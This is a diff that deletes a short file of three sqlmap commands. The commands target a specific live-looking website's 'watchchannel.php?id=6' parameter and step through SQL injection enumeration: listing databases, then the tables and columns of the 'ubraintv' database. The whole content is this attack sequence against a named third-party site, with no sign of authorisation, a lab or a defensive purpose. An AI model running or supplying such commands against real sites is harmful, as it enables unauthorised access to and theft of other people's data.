@@ -1,5 +1,0 @@
-python sqlmap.py -u www.ubraintv.com/watchchannel.php?id=6  --dbs
-
-python sqlmap.py -u www.ubraintv.com/watchchannel.php?id=6  -D ubraintv --tables
-
-python sqlmap.py -u www.ubraintv.com/watchchannel.php?id=6  -D ubraintv --tables --columns
